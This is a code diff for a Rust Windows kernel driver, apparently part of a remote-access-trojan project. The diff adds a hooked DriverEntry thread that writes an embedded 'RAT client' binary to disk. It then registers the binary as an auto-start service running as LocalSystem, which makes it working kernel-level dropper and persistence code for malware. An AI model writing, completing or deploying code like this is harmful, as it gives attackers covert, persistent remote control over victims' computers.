@@ -1,22 +1,36 @@
 use core::ffi::c_void;
 use core::ptr;
 
-use log::info;
+use log::{error, info};
+use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
-use wdk_sys::ntddk::{KeDelayExecutionThread, PsCreateSystemThread};
-use wdk_sys::{DRIVER_OBJECT, LARGE_INTEGER, NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS};
-use widestring::Utf16Str;
+use wdk_sys::ntddk::{
+    KeDelayExecutionThread, PsCreateSystemThread, RtlInitUnicodeString, ZwClose, ZwCreateFile,
+    ZwCreateKey, ZwWriteFile,
+};
+use wdk_sys::{
+    FILE_ATTRIBUTE_NORMAL, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, GENERIC_WRITE, HANDLE,
+    IO_STATUS_BLOCK, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE,
+    OBJ_KERNEL_HANDLE, OBJECT_ATTRIBUTES, PDRIVER_OBJECT, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE,
+    REG_SZ, STATUS_OBJECT_NAME_COLLISION, SYNCHRONIZE, THREAD_ALL_ACCESS, UNICODE_STRING,
+};
+use widestring::{U16CStr, Utf16Str, u16cstr};
 
+use crate::global::{RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_PATH, SERVICE_REGISTRY};
 use crate::log;
+use crate::wrappers::bindings::InitializeObjectAttributes;
+use crate::wrappers::registry;
 
-unsafe extern "C" fn thread_routine(context: *mut c_void) {
-    let driver = context.cast::<DRIVER_OBJECT>();
+unsafe extern "C" fn thread_routine(_: *mut c_void) {
     let mut sleep = LARGE_INTEGER {
         QuadPart: -50000000,
     };
     loop {
-        log!("Thread running from driver {driver:p}");
+        if do_drop_file().is_ok() {
+            break;
+        }
+
         let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
         if !nt_success(status) {
             log!("KeDelayExecutionThread failed: 0x{status:X}");
@@ -25,12 +39,153 @@ unsafe extern "C" fn thread_routine(context: *mut c_void) {
     }
 }
 
+fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
+    let mut attributes = OBJECT_ATTRIBUTES::default();
+    let mut root_directory = UNICODE_STRING::default();
+    unsafe {
+        RtlInitUnicodeString(&mut root_directory, SERVICE_REGISTRY.as_ptr());
+        InitializeObjectAttributes(
+            &mut attributes,
+            &mut root_directory,
+            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+            ptr::null_mut(),
+            ptr::null_mut(),
+        );
+    }
+
+    let mut key = HANDLE::default();
+    let status = unsafe {
+        ZwCreateKey(
+            &mut key,
+            KEY_ALL_ACCESS,
+            &mut attributes,
+            0,
+            ptr::null_mut(),
+            REG_OPTION_NON_VOLATILE,
+            ptr::null_mut(),
+        )
+    };
+    if !nt_success(status) {
+        anyhow::bail!("ZwCreateKey failed: 0x{status:X}");
+    }
+
+    let guard = DropGuard::new(key, |key| unsafe {
+        let _ = ZwClose(key);
+    });
+
+    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
+    for status in [
+        registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
+        registry::registry_write_dword(
+            key,
+            u16cstr!("Type"),
+            0x10, // SERVICE_WIN32_OWN_PROCESS
+        ),
+        registry::registry_write_dword(
+            key,
+            u16cstr!("Start"),
+            0x2, // SERVICE_AUTO_START
+        ),
+        registry::registry_write_dword(
+            key,
+            u16cstr!("ErrorControl"),
+            0x1, // SERVICE_ERROR_NORMAL
+        ),
+        registry::registry_write_string(
+            key,
+            u16cstr!("ObjectName"),
+            u16cstr!("LocalSystem"),
+            REG_SZ,
+        ),
+    ] {
+        if !nt_success(status) {
+            anyhow::bail!("ZwSetValueKey failed: 0x{status:X}");
+        }
+    }
+
+    drop(guard);
+    Ok(())
+}
+
+fn drop_file() -> anyhow::Result<()> {
+    let mut u_path = UNICODE_STRING::default();
+    let mut object_attributes = OBJECT_ATTRIBUTES::default();
+    unsafe {
+        RtlInitUnicodeString(&mut u_path, RAT_CLIENT_OBJ_PATH.as_ptr());
+        InitializeObjectAttributes(
+            &mut object_attributes,
+            &mut u_path,
+            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+            ptr::null_mut(),
+            ptr::null_mut(),
+        );
+    }
+
+    let mut handle = HANDLE::default();
+    let mut status_block = IO_STATUS_BLOCK::default();
+    let status = unsafe {
+        ZwCreateFile(
+            &mut handle,
+            GENERIC_WRITE | SYNCHRONIZE,
+            &mut object_attributes,
+            &mut status_block,
+            ptr::null_mut(),
+            FILE_ATTRIBUTE_NORMAL,
+            0,
+            FILE_SUPERSEDE,
+            FILE_SYNCHRONOUS_IO_NONALERT,
+            ptr::null_mut(),
+            0,
+        )
+    };
+
+    if nt_success(status) {
+        let guard = DropGuard::new(handle, |handle| unsafe {
+            let _ = ZwClose(handle);
+        });
+
+        let status = unsafe {
+            ZwWriteFile(
+                handle,
+                ptr::null_mut(),
+                None,
+                ptr::null_mut(),
+                &mut status_block,
+                RAT_CLIENT.as_ptr() as *mut c_void,
+                RAT_CLIENT.len() as u32,
+                ptr::null_mut(),
+                ptr::null_mut(),
+            )
+        };
+        if nt_success(status) {
+            return Ok(());
+        }
+
+        drop(guard);
+        anyhow::bail!("ZwWriteFile failed: 0x{status:X}");
+    } else if status != STATUS_OBJECT_NAME_COLLISION {
+        anyhow::bail!("ZwCreateFile failed: 0x{status:X}");
+    }
+
+    Ok(())
+}
+
+fn do_drop_file() -> anyhow::Result<()> {
+    drop_file()
+        .inspect(|_| match setup_service_registry(RAT_CLIENT_PATH) {
+            Ok(_) => info!("Service registry setup successfully"),
+            Err(e) => info!("Failed to setup service registry: {e}"),
+        })
+        .inspect_err(|e| {
+            error!("Failed to drop RAT client: {e}");
+        })
+}
+
 pub fn driver_entry_prehook(
     driver: PDRIVER_OBJECT,
     registry_path: Option<&Utf16Str>,
 ) -> anyhow::Result<()> {
     info!("DriverEntry: {driver:p}, {registry_path:?}");
-    log!("DriverEntry: {driver:p}, {registry_path:?}");
     let mut thread = ptr::null_mut();
 
     let status = unsafe {
@@ -41,7 +196,7 @@ pub fn driver_entry_prehook(
             ptr::null_mut(),
             ptr::null_mut(),
             Some(thread_routine),
-            driver.cast(),
+            ptr::null_mut(),
         )
     };
     if !nt_success(status) {
@@ -57,6 +212,5 @@ pub fn driver_entry_posthook(
     status: NTSTATUS,
 ) -> anyhow::Result<()> {
     info!("Original DriverEntry returned with status: 0x{status:X}");
-
     Ok(())
 }
